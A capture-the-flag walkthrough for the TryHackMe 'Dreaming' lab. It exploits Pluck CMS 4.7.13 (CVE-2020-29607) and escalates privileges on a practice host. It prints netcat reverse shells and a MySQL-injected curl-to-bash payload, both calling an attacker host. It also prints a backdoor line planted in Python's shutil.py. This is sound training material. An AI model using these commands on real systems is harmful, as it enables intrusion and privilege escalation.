---
layout: post
title: TryHackMe/Easy/Dreaming
abbrlink: 55ddbbdc1cb4458aad24bbe1a9ec740b
tags:
  - cve-2020-29607
  - pluck cms
  - python
  - web
  - linux
categories:
  - Labs
  - TryHackMe
  - 1. Easy
  - Dreaming
date: 1716496366968
updated: 1721871439338
---

<https://tryhackme.com/r/room/dreaming>

# Scenario

While the king of dreams was imprisoned, his home fell into ruins.

Can you help Sandman restore his kingdom?

# Enumeration

## \[+] 10.10.187.205 - dreaming.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.187.205 dreaming.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.187.205
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] dreaming.thm

There's only a default Apache page here, so let's use [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt) to fuzz for directories and files:

```sh
feroxbuster -u http://dreaming.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

We should get two interesting results:

![f00fdee5d48dbf0c985b9da5a9a18896.png](/resources/fd5354dfd6804c8b9518d1d4da2408ed.png)

### \[-] dreaming.thm/app/pluck-4.7.13

When you first get to this page, you may notice the `?file=dreaming` parameter added to the URL. It's not vulnerable to LFI or Command Injection and you will see this message if you try:

![cc672094101610260bb9f9c1d9c6acf7.png](/resources/aba1b563fde244049ff2e1b94c0f718b.png)

Instead let's focus on the "admin" link at the page footer:

![1c8f5d6a6728480c5ed7472df1c328af.png](/resources/8934cd225e95406e829bf1d15f857ce0.png)

### \[-] dreaming.thm/app/pluck-4.7.13/login.php

This is a very basic login portal without much security:

![f208afda85d2542048fc7fe39bcbb5ff.png](/resources/495a0baeca4d43ffa9b618cf0845839e.png)

We can try brute forcing it, but first, let's try some default passwords like "password":

![5a6f16d8e1fbd03a4837b172724716c6.png](/resources/faca73544b5b45ad8f70e774394cd820.png)

# Initial Access

### \[-] www-data\@dreaming

From here, I searched for "pluck 4.7.13 exploit" and found an Authenticated RCE on [Exploit-DB](https://www.exploit-db.com/exploits/49909) for [CVE-2020-29607](https://nvd.nist.gov/vuln/detail/CVE-2020-29607). After downloading the script, we just need to plug in the values and we will have a web shell. The syntax is `python3 49909.py <VICTIM_IP> <VICTIM_PORT> <PASSWORD> <DIRECTORY_OF_PLUCK>`:

```sh
python3 49909.py $RHOSTS 80 password /app/pluck-4.7.13
```

When the exploit is done, we can visit the link provided to access the webshell:

![10bfe7f76f219af98200bd5c40ed1212.png](/resources/4b7a436a7f3c458e92d79e788b2eae39.png)

![a8b24de67aff0248ee180f54db59b51c.png](/resources/a9be38e63b4446f8ba2daf8aa2adf3ef.png)

From here we can use the `mkfifo` version of the reverse shell to get a better shell. First we start a [Netcat](https://linux.die.net/man/1/nc) listener on our attacking machine:

```sh
nc -nvlp 4444
```

Then back on the web shell we enter the command:

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Let's stablize the shell we just got doing the following steps:

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` ... Use Python to spawn a stable shell
2. `CTRL + Z` ... Backgrounds the current shell
3. `stty raw -echo;fg` ... Fixes echoing and foregrounds the shell
4. `export TERM=xterm-256color` ... Sets terminal to xterm

![8d28f547ea860567eddf9b7a4360a384.png](/resources/ce7930cb76314f0a857f27fa665ca778.png)
![5384b576af8fa7a434d27c16f963646e.png](/resources/8d6c0bb0cbd8449c8f6a9a4316671d05.png)

# Privilege Escalation

### \[-] lucien\@dreaming

After some enumeration, we will find an interesting file in the `/opt` directory named `test.py`. If we `cat` this file we'll find the password for the user `lucien`:

```sh
cd /opt
ls -lah
cat test.py
```

![863a6ca6cb76b489e97fbd96fd005800.png](/resources/b141e3aa3264457ba17e068b31a81eba.png)

Let's open a new terminal and connect as `lucien` via SSH and enter the password when prompted:

```sh
ssh lucien@<VICTIM_IP>
yes
<PASSWORD>
```

![7d1b1c80cbee27f2d8b8635e48d38460.png](/resources/926b7569d35c4a2f9496813a8f0d2e84.png)
![7f8693fee5f48c1cbbae24751bc4a953.png](/resources/f308a822a3484f45b802762e78ccc491.png)

The flag for `lucien` is in `/home/lucien/lucien_flag.txt`:

```sh
cat /home/lucien/lucien_flag.txt
```

![16bd670bdea50e5c5a3505b50ec7d988.png](/resources/55abf601abf44c81a301187ef7afd20b.png)

Also if you look at the size of the `.bash_history` file, it has not been cleared so let's also take a look at that:

```sh
cat /home/lucien/.bash_history
```

We'll find that the user `lucien` mis-typed the command for `mysql` and leaked their password in the `.bash_history` log:

![0c602e1c0a69c0534ed435b379a33209.png](/resources/cec05ac197a94f8faa23a4522bb1b2c0.png)

Before going into MySQL, let's take a look at the `.mysql_history` log:

```sh
cat /home/lucien/.mysql_history
```

![8f5be4ea5dbf14d8c478ebc33294ef79.png](/resources/7a8de7e04bca4f65a4cbf0bd6ea10d1a.png)

It seems like they were trying to test for Command Injection by injecting the `whoami` command into the "dreams" column. We can clean up this log by pasting it into a text editor and using the "Find and Replace" feature to look for `\40` and replace it with a space (I used [Sublime Text](https://www.sublimetext.com/)):

![77dc00a04c3bf1d9c1776d50d55747b3.png](/resources/5bf018ad3e5f49e9be6a845fd7088951.png)

The most important command here is `INSERT INTO dreams (dreamer, dream) VALUES ('whoami', 'TEST');`, so make a note of that for later.

Going back to the `.bash_history` file, we'll notice another interesting command:

![7014c7abe78e77b08b31e128c4aa6b7a.png](/resources/9a33a9959ed343e2a3fabb9bd3d58aa7.png)

It seems like we have permissions to run a Python script as the user `death`. Let's confirm this by running the command `sudo -l`:

![fbb3448f7781d665cce4c0a67ac423b9.png](/resources/dfe816a3daa1497aab9c46fe0c79e476.png)

### \[-] death\@dreaming

We can put all these pieces together to get a shell back as the user `death`. Since, we can run `getDreams.py` we might be able to run commands as `death`. Although the `getDreams.py` file is not directly writeable for us, we can make guesses on how the application works based on our findings.

1. We found a MySQL database containing "dreamers" and "dreams".
2. The `.mysql_history` file shows a path possible command injection.
3. We can run the `getDreams.py` script as the user `death`

It seems like the user `lucien` is responsible for managing the MySQL database and the user `death` gave permissions to access the `getDreams.py` script for retrieving the data in the MySQL database. If we can inject a command into the MySQL database, when the `getDreams.py` script runs as the user `death`, we will be running the injected command as `death`.

First, let's run the command and provide the password we just found (the string after the `-p` part):

```sh
mysql -u lucien -p
```

Then we can list the databases using `show databases;`:

![601f665ef5c80b810126aff06b2250ea.png](/resources/6cedf94b9fad4063bea587afa49fe840.png)

Select the database using `use library;` then list the tables using `show tables`:

![1d74a559cab348fdc10e3cd3e85910a6.png](/resources/ae80adb87c9a4068a816fe4f46498a23.png)

Now we can print the data using `select * from dreams;`:

![f7806e0d622934b30e768908e2197bab.png](/resources/c372c9a678a740d99b30fb27e1be4d28.png)

In MySQL we can run commands by wrapping the command in `$()`, for example `$(whoami)`.

To get a reverse shell, let's first create a file named `shell.sh` on our attacking machine with the same reverse shell we used in the web shell (change ports if needed):

```sh
#!/usr/bin/env bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4445 >/tmp/f
```

Then host the file using Pythin:

```sh
python3 -m http.server 8888
```

And set up a Netcat listener:

```sh
nc -nvlp 4445
```

Back on the victim machine as `lucien`. We run MySQL again:

```sh
mysql -u lucien -p
use library
```

Now we can inject this `curl` command which will download our `shell.sh` script, pipe it to `bash` and get us a reverse shell:

```mysql
INSERT INTO dreams (dreamer, dream) VALUES ('$(curl <ATTACKER_IP>:8888/shell.sh|bash)', 'TEST');
```

After entering the command we should receive the message "Query OK, 1 row affected (0.01 sec)". Exit MySQL using `exit;`.

```mysql
exit;
```

Next if we run the `getDreams.py` script using `sudo` we should get a reverse shell back as the user `death`:

```sh
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

Notice the last entry is our `curl` command downloading the script, when the `% Total` reaches `100` the download has been completed:

![a0d617ef204353be11b0f2e2919709df.png](/resources/eedf6dc99892415f9ff39fd099f49550.png)

Checking our listener on port 4445 and running `whoami`:

![afab4f3761f5deec5d07728a9436d0c3.png](/resources/ae2163721baa4ad6a71951200c23ddfb.png)

Use the same steps as earlier to stabilize the shell:

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` ... Use Python to spawn a stable shell
2. `CTRL + Z` ... Backgrounds the current shell
3. `stty raw -echo;fg` ... Fixes echoing and foregrounds the shell
4. `export TERM=xterm-256color` ... Sets terminal to xterm

To get the flag, we have to change our directory since we are still in `/home/lucien`, then list the files and `cat` the flag:

```sh
cd /home/death
ls -lah
cat death_flag.txt
```

![acab42d89efea10a4d229c4e663502f6.png](/resources/1f6583e1a7b344eda07fa3016b7eac6d.png)

### morpheus\@dreaming

Also in the `/home/death/` directory, we can see the `getDreams.py` source code and there is a MySQL password for `death`, which we can use for SSH access if we need to.

From here, I downloaded [pspy32](https://github.com/DominicBreuker/pspy/releases) onto the victim machine to see what processes were running.

After downloading pspy32 on the attacking machine, if the Python HTTP server is still running from earlier, we can place it in that same directory, else we can start the HTTP server by running:

```sh
python3 -m http.server 8888
```

On the victim machine, as the user `death` we use `wget` to download the file:

```sh
wget <ATTACKER_IP>:8888/pspy32
```

Then give the binary execute permissions with `chmod +x` then run it:

```sh
chmod +x pspy32
./pspy32
```

Letting pspy32 run for a couple of minutes reveals a Python script running every minute as a [cron](https://en.wikipedia.org/wiki/Cron) job:

![65aef6d0cc45e7f6c68d941049de07c7.png](/resources/20e19e671dd243d69b4bd9ded583994d.png)

We can press `CTRL + C` to close pspy32, but sometime's it kills the entire shell, so you might have to reconnect via SSH.

Using `ls -lah` we can see the permissions for the script and since we can read it, we can use `cat` to see the source code:

```sh
ls -lah /home/morpheus/restore.py
cat /home/morpheus/restore.py
```

![28e21f797bf2f2ff3fa87f5a3040e395.png](/resources/47f790eb76294a8da4bc918d61817bd3.png)

The script is making a backup of `/home/morpheus/kingdom` and saving it to `/kingdom_backup/kingdom` but we don't have access to either of those. So, let's focus on the library `shutil` instead.

To find the `shutil.py` file that the script is using to import functions from, we can run the command:

```sh
find / -name 'shutil.py' -type f 2>/dev/null
```

![8bde353fcbd9cb48da2d6b6e663791e7.png](/resources/e928a8ba5edd4aa4a45d61656c6babee.png)

Check the permissions for the file using:

```sh
ls -lah /usr/lib/python3.8/shutil.py
```

And we'll find that we have write permissions:

![e30169b41d8d10faf2d4e2493ccc07c0.png](/resources/83317fe9918e484bb31942b817674192.png)

Let's open this file in `vim`, scroll up to the top - just after `import errno`, press `i` to enter Insert mode (indicated at the bottom), and add a line of code which will give full permissions of the `/home/morpheus` directory:

Run this command:

```sh
vim /usr/lib/python3.8/shutil.py
```

Insert this code:

```python
os.system('chmod -R 777 /home/morpheus')
```

![642c91fbbb3cdeca97e6c0beaa1ed2e7.png](/resources/618f0f9ee6f3495db860ef5c69f76aca.png)

To exit `vim`, press the `ESC` key, then type `:wq` and press the `ENTER` key.

The output might be a little messed up, we can either reconnect via SSH or proceed.

After a minute or so, if we check the `/home/morpheus` directory we can find the flag and use `cat` to print the contents:

```sh
ls -lah /home/morpheus
cat /home/morpheus/morpheus_flag.txt
```

![69d9c124ebcfad9b69aaa8acf73027f0.png](/resources/05e7c87318244415a8ec4937438252f3.png)
